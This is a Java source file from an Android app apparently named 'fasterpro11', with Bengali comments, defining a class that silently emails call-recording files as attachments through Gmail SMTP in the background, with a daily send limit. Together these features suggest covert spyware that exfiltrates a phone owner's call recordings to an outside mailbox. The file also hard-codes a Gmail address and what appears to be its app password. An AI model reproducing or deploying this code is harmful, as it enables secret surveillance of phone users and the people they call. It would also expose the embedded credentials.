package com.example.fasterpro11;

import android.os.AsyncTask; // AsyncTask ব্যবহার
import android.util.Log; // লগ ব্যবহারের জন্য

import java.io.File; // ফাইল ব্যবহারের জন্য
import java.util.Properties; // প্রপার্টি সেটিংস
import javax.activation.DataHandler; // ডেটা হ্যান্ডলার
import javax.activation.DataSource; // ডেটা সোর্স
import javax.activation.FileDataSource; // ফাইল ডেটা সোর্স
import javax.mail.*; // মেইল ব্যবহারের জন্য
import javax.mail.internet.*; // ইন্টারনেট মেইল

public class JavaMailAPI_CallRecord_Sender {
    private static final String TAG = "JavaMailAPI"; // লগ ট্যাগ
    private String email; // প্রাপক ইমেইল
    private String subject; // ইমেইল সাবজেক্ট
    private String message; // ইমেইল মেসেজ
    private String filePath; // ফাইলের পাথ

    // কনস্ট্রাক্টর
    public JavaMailAPI_CallRecord_Sender(String email, String subject, String message, String filePath) {
        this.email = email; // প্রাপক ইমেইল সেট করা
        this.subject = subject; // সাবজেক্ট সেট করা
        this.message = message; // মেসেজ সেট করা
        this.filePath = filePath; // ফাইল পাথ সেট করা
    }

    // মেইল পাঠানোর মেথড
    public void sendMail() {
        new SendMailTask().execute(); // AsyncTask শুরু
    }

    private class SendMailTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            try {
                // ইমেল পাঠানোর অনুমতি চেক করুন
                if (!CountEmail.canSendEmail()) {
                    Log.d(TAG, "Email limit reached for today. No email sent."); // সীমা পৌঁছালে লগ
                    return null; // মেইল পাঠানো হবে না
                }

                // SMTP সেটিংস
                Properties props = new Properties();
                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP সার্ভার
                props.put("mail.smtp.port", "587"); // SMTP পোর্ট
                props.put("mail.smtp.auth", "true"); // অথেনটিকেশন
                props.put("mail.smtp.starttls.enable", "true"); // TLS সক্রিয় করা

                final String username = "abontiangum99@gmail.com"; // আপনার Gmail ঠিকানা
                final String password = "egqnjvccoqtgwaxo"; // আপনার Gmail পাসওয়ার্ড

                // সেশন তৈরি করা
                Session session = Session.getInstance(props, new Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password); // অথেনটিকেশন
                    }
                });

                // মেইল মেসেজ তৈরি করা
                MimeMessage mimeMessage = new MimeMessage(session);
                mimeMessage.setFrom(new InternetAddress(username)); // প্রেরক সেট করা
                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // প্রাপক সেট করা
                mimeMessage.setSubject(subject); // সাবজেক্ট সেট করা

                // মেসেজ এবং অ্যাটাচমেন্ট যুক্ত করা
                Multipart multipart = new MimeMultipart();
                MimeBodyPart messageBodyPart = new MimeBodyPart();
                messageBodyPart.setText(message); // মেসেজ সেট করা
                multipart.addBodyPart(messageBodyPart); // মেসেজ যুক্ত করা

                // ফাইল অ্যাটাচমেন্ট যুক্ত করা (যদি থাকে)
                if (filePath != null && !filePath.isEmpty()) {
                    try {
                        MimeBodyPart attachmentPart = new MimeBodyPart();
                        DataSource source = new FileDataSource(filePath); // ফাইল সোর্স
                        attachmentPart.setDataHandler(new DataHandler(source)); // ডেটা হ্যান্ডলার
                        attachmentPart.setFileName(new File(filePath).getName()); // ফাইলের নাম
                        multipart.addBodyPart(attachmentPart); // অ্যাটাচমেন্ট যুক্ত করা
                    } catch (Exception e) {
                        Log.e(TAG, "Error attaching file: " + e.getMessage()); // ফাইল অ্যাটাচমেন্ট ত্রুটি লগ
                        e.printStackTrace();
                    }
                }

                mimeMessage.setContent(multipart); // মেইল কনটেন্ট সেট করা

                // মেইল পাঠানো
                Transport.send(mimeMessage);
                CountEmail.incrementEmailCount(); // ইমেল সফলভাবে পাঠানোর পর কাউন্টার বাড়ান
                Log.d(TAG, "Callrecord Email sent successfully with attachment."); // সফল লগ
            } catch (MessagingException e) {
                Log.e(TAG, "Callrecord Error occurred while sending email: " + e.getMessage()); // মেসেজিং ত্রুটি
                e.printStackTrace();
            } catch (Exception e) {
                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // অন্য ত্রুটি
                e.printStackTrace();
            }
            return null; // সম্পন্ন
        }
    }

    // স্ট্যাটিক মেথড যা অন্য জায়গা থেকে ব্যবহার করা যাবে
    public static void sendMailWithAttachment(String email, String subject, String message, String filePath) {
        try {
            JavaMailAPI_CallRecord_Sender javaMailAPI = new JavaMailAPI_CallRecord_Sender(email, subject, message, filePath);
            javaMailAPI.sendMail(); // মেইল পাঠানোর মেথড কল করা
        } catch (Exception e) {
            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // স্ট্যাটিক মেথডে ত্রুটি
            e.printStackTrace();
        }
    }
}
